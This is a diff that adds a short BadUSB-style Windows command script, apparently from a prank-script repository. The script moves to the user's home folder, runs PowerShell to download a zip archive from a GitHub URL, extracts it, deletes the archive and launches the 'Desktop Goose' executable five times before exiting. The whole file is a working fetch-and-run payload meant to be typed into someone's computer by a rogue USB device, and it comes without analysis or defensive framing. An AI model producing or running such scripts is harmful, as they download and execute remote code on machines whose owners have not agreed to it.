@@ -1,0 +1,2 @@
+cd %homepath%
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/DesktopGoose/Goose.zip -OutFile .\Goose.zip; Expand-Archive -Path "$env:userprofile/Goose.zip" -DestinationPath "$env:userprofile/Goose"; Remove-Item "$env:userprofile/Goose.zip" && cd "Goose\Desktop Goose v0.31\DesktopGoose v0.31" && start GooseDesktop.exe && start GooseDesktop.exe && start GooseDesktop.exe && start GooseDesktop.exe && start GooseDesktop.exe && exit
